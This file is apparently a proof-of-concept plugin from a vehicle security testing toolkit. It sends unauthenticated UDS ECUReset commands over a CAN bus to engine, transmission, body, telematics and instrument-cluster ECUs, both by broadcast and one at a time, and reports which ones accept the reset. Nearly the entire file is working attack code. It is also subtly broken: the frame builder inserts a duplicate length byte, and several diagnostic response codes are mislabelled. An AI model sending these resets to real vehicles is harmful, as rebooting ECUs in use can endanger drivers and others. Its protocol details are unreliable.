"""
PoC Name: UDS ECU Reset Unauthenticated (0x11)
CVE: N/A
Component: Canbus Stack
Category: Canbus
Severity: High
CVSS: 7.5
Description: 在 UDS DefaultSession 下无需 SecurityAccess 认证，直接向目标 ECU 发送 0x11 SoftReset/HardReset 指令。覆盖 ECM/TCM/BCM/IC 等常见 ECU，全车通用
Prerequisites: 激活的SocketCAN接口(如can0)及python-can支持
Usage: python3 30_UDS_ECU_Reset_Unauth.py <args>
"""
import sys
import struct
import time
from iv_plugin_base import IVIVulnerabilityPlugin

try:
    import can
    CAN_AVAILABLE = True
except ImportError:
    CAN_AVAILABLE = False


class UDSECUResetPlugin(IVIVulnerabilityPlugin):
    """
    UDS ECU Reset 服务（0x11）未授权执行 PoC

    漏洞描述:
    ISO 14229-1 UDS 协议定义了 0x11（ECUReset）服务，用于复位 ECU。
    该服务在不要求安全会话的情况下，部分 ECU 实现允许在 DefaultSession（默认会话）
    下直接执行软复位（01h）或硬复位（03h），无需经过 SecurityAccess（0x27）认证。

    若攻击者可访问 CAN 总线（如通过 OBD-II 端口、车载以太网网关），
    可向目标 ECU 广播复位指令，导致 ECU 重启、功能临时中断。

    与现有 PoC 的区别:
    - #23（UDS DiagSession Bypass）: 测试切换诊断会话（0x10）
    - #24（Security Access Brute Force）: 暴力破解 Seed-Key（0x27）
    - #26（RoutineControl）: 测试例程控制（0x31）
    本 PoC 直接测试 0x11 服务，不依赖 SecurityAccess，验证最基础的复位权限控制。

    检测逻辑:
    1. 发送 UDS 0x10 0x01（DefaultSession 建立请求），确认总线可用
    2. 在 DefaultSession 下发送 UDS 0x11 0x03（HardReset）到广播地址 0x7DF
    3. 同时尝试对 ECM（0x7E0）、BCM（0x76B）等常见 ECU 单播发送
    4. 监听总线是否出现 NRC 0x7F 0x11 0x25（conditionsNotCorrect 拒绝）
       或 0x50 0x03（正响应，接受复位）
    5. 接受复位 = 漏洞存在；0x25 拒绝 = 正常安全控制

    安全性: HardReset 会造成 ECU 短暂重启，测试前请确认已获得授权环境。
             SoftReset（01h）影响更小，默认优先测试 SoftReset。
    """

    # UDS 功能寻址广播 ID（所有 ECU 均监听）
    UDS_FUNCTIONAL_REQ = 0x7DF
    # ArbID 回复基址（单播 request: 0x7E0 → response: 0x7E8）
    UDS_ECU_TARGETS = [
        (0x7E0, 0x7E8, "Engine Control Module (ECM)"),
        (0x7E1, 0x7E9, "Transmission Control Module (TCM)"),
        (0x7E2, 0x7EA, "Telematics/TCU"),
        (0x76B, 0x773, "Body Control Module (BCM)"),
        (0x760, 0x768, "Instrument Cluster (IC)"),
        (0x7DF, None,  "Functional Broadcast (all ECUs)"),
    ]
    # UDS 服务 ID
    SID_DIAG_SESSION = 0x10
    SID_ECU_RESET    = 0x11
    # ECUReset sub-functions
    RESET_SOFT  = 0x01  # softReset: 最小影响
    RESET_HARD  = 0x03  # hardReset: 完整重启
    RESET_KEYS  = 0x02  # keyOffOnReset: 模拟断电重启

    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "UDS-ECUReset-Unauth"
        self.results["description"] = (
            "UDS ECU Reset 服务（0x11）未授权执行 - "
            "在 DefaultSession 下无需 SecurityAccess 即可复位目标 ECU"
        )
        self.interface = (
            self.params.get("can_interface") or
            self.params.get("interface") or
            "can0"
        )
        # 默认只测试 SoftReset，安全性更高
        self.test_hard_reset = self.params.get("test_hard_reset", False)

    def check_prerequisites(self):
        if not CAN_AVAILABLE:
            self.logger.error(
                "未找到 python-can 库，请先安装: pip install python-can"
            )
            return False
        # 验证 CAN 接口可用
        try:
            bus = can.interface.Bus(channel=self.interface, bustype="socketcan")
            bus.shutdown()
            self.logger.info(f"CAN 接口 {self.interface} 可用。")
            return True
        except Exception as e:
            self.logger.error(f"CAN 接口 {self.interface} 不可用: {e}")
            return False

    def _send_uds(self, bus, arb_id, data, timeout=1.5):
        """发送 UDS 请求帧并等待响应，返回响应 CAN message 或 None"""
        # 构造 ISO 15765-2 单帧 (SF): 长度 + 数据
        # SF 格式: [0x0N, b0, b1, ..., 0x00×padding]
        payload_len = len(data)
        frame = bytes([payload_len]) + bytes(data)
        frame = frame.ljust(8, b"\xaa")  # 填充至 8 字节

        msg = can.Message(arbitration_id=arb_id, data=frame, is_extended_id=False)
        try:
            bus.send(msg)
            self.logger.info(
                f"  → TX 0x{arb_id:03X}: {frame.hex().upper()}"
            )
        except Exception as e:
            self.logger.error(f"发送失败: {e}")
            return None

        # 等待响应
        deadline = time.time() + timeout
        while time.time() < deadline:
            resp = bus.recv(timeout=0.3)
            if resp is None:
                continue
            # 过滤：响应 ID 通常是请求 ID + 8（单播），或功能寻址回复
            d = resp.data
            if len(d) >= 3:
                # 检查是否是 UDS 肯定响应 (SID+0x40) 或否定响应 (0x7F)
                if d[0] in (0x02, 0x03, 0x04, 0x05) and (d[1] == 0x7F or d[1] == self.SID_ECU_RESET + 0x40):
                    self.logger.info(
                        f"  ← RX 0x{resp.arbitration_id:03X}: {bytes(d).hex().upper()}"
                    )
                    return resp
                # 也接收 DiagSession 响应
                if d[0] in (0x02, 0x03) and d[1] == self.SID_DIAG_SESSION + 0x40:
                    self.logger.info(
                        f"  ← RX DiagSession 0x{resp.arbitration_id:03X}: {bytes(d).hex().upper()}"
                    )
                    return resp
        return None

    def _parse_uds_response(self, resp_msg):
        """
        解析 UDS 响应：
        返回 ('positive', sub) | ('negative', nrc) | ('unknown',)
        """
        if resp_msg is None:
            return ('timeout',)
        d = resp_msg.data
        if len(d) < 2:
            return ('unknown',)
        # 去掉 ISO-TP SF 长度字节
        sf_len = d[0] & 0x0F
        payload = d[1:1+sf_len]
        if not payload:
            return ('unknown',)

        if payload[0] == 0x7F:  # NRC
            sid = payload[1] if len(payload) > 1 else 0
            nrc = payload[2] if len(payload) > 2 else 0
            return ('negative', sid, nrc)
        elif payload[0] == self.SID_ECU_RESET + 0x40:  # 0x51 = 正响应
            sub = payload[1] if len(payload) > 1 else 0
            return ('positive', sub)
        elif payload[0] == self.SID_DIAG_SESSION + 0x40:  # 0x50
            return ('session_ok',)
        return ('unknown',)

    def exploit(self):
        iface = self.interface

        try:
            bus = can.interface.Bus(channel=iface, bustype="socketcan")
        except Exception as e:
            self.logger.error(f"无法打开 CAN 接口: {e}")
            self.results["evidence"] = f"CAN 接口 {iface} 打开失败: {e}"
            return

        vulnerable_ecus = []
        rejected_ecus = []

        reset_type = self.RESET_SOFT
        reset_name = "SoftReset(01)"
        self.logger.info(
            f"[*] 开始 UDS ECU Reset 未授权检测 (接口={iface}, 复位类型={reset_name})"
        )

        try:
            # ── Step 1: 广播功能寻址 DefaultSession 请求 ──
            self.logger.info("\n[1/2] 发送 UDS DefaultSession 建立请求（广播）...")
            sess_resp = self._send_uds(
                bus, self.UDS_FUNCTIONAL_REQ,
                [0x02, self.SID_DIAG_SESSION, 0x01]
            )
            if sess_resp:
                self.logger.info("[+] 总线有 ECU 响应，DefaultSession 可建立。")
            else:
                self.logger.info("[*] 广播无响应（ECU 可能不支持广播 Session）。")

            # ── Step 2: 对每个目标 ECU 发送 ECUReset ──
            self.logger.info(f"\n[2/2] 对 {len(self.UDS_ECU_TARGETS)} 个目标发送 0x11 {reset_name}...")
            for req_id, resp_id, name in self.UDS_ECU_TARGETS:
                self.logger.info(f"\n  目标: {name} (req=0x{req_id:03X})")

                resp = self._send_uds(
                    bus, req_id,
                    [0x02, self.SID_ECU_RESET, reset_type]
                )
                result = self._parse_uds_response(resp)

                if result[0] == 'positive':
                    self.logger.warning(
                        f"  [!!!] {name} 接受 ECUReset！返回正响应 0x51 0x{result[1]:02X}"
                    )
                    vulnerable_ecus.append((req_id, name, "正响应 0x51"))
                elif result[0] == 'negative':
                    nrc_hex = f"0x{result[2]:02X}" if len(result) > 2 else "?"
                    nrc_name = {
                        0x22: "conditionsNotCorrect",
                        0x25: "requestOutOfRange",
                        0x33: "securityAccessDenied",
                        0x7E: "subFunctionNotSupportedInActiveSession",
                    }.get(result[2] if len(result) > 2 else 0, "unknown NRC")
                    self.logger.info(
                        f"  [-] {name} 拒绝 ECUReset: NRC {nrc_hex} ({nrc_name})"
                    )
                    rejected_ecus.append((req_id, name, nrc_name))
                elif result[0] == 'timeout':
                    self.logger.info(f"  [-] {name} 无响应（超时或不支持）")
                else:
                    self.logger.info(f"  [?] {name} 未知响应")

                time.sleep(0.3)  # ECU 间隔

        finally:
            bus.shutdown()

        # ── 结果汇总 ──
        if vulnerable_ecus:
            self.results["vulnerable"] = True
            details = "\n".join(
                f"  0x{rid:03X} {nm}: {resp}"
                for rid, nm, resp in vulnerable_ecus
            )
            self.results["evidence"] = (
                f"UDS ECUReset 未授权执行漏洞确认（接口={iface}）：\n"
                f"以下 ECU 在 DefaultSession 下无需 SecurityAccess 即接受 0x11 {reset_name}：\n"
                f"{details}\n"
                f"被拒绝的 ECU（安全控制正常）: {[nm for _,nm,_ in rejected_ecus]}"
            )
            print(
                f"[!] 【漏洞存在】UDS ECUReset 未授权 - 漏洞 ECU: "
                f"{[f'0x{r:03X}({n})' for r,n,_ in vulnerable_ecus]}"
            )
        elif rejected_ecus:
            self.results["vulnerable"] = False
            self.results["evidence"] = (
                f"所有响应的 ECU 均拒绝了未授权 ECUReset 请求（安全控制正常）：\n"
                + "\n".join(f"  0x{r:03X} {n}: {nr}" for r,n,nr in rejected_ecus)
            )
            self.logger.info("[+] 目标 ECU 安全控制正常，未检测到未授权 ECUReset 漏洞。")
        else:
            self.results["vulnerable"] = False
            self.results["evidence"] = (
                f"CAN 总线上未收到任何 UDS 响应。"
                f"可能原因：接口 {iface} 未正确连接到 OBD-II/车载以太网，"
                f"或目标 ECU 不支持 UDS 协议。"
            )
            self.logger.info("[-] 未收到任何 UDS 响应，无法判断漏洞。")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 30_UDS_ECU_Reset_Unauth.py <args>")
        sys.exit(1)
    plugin = UDSECUResetPlugin(config)
    plugin.run_verify()
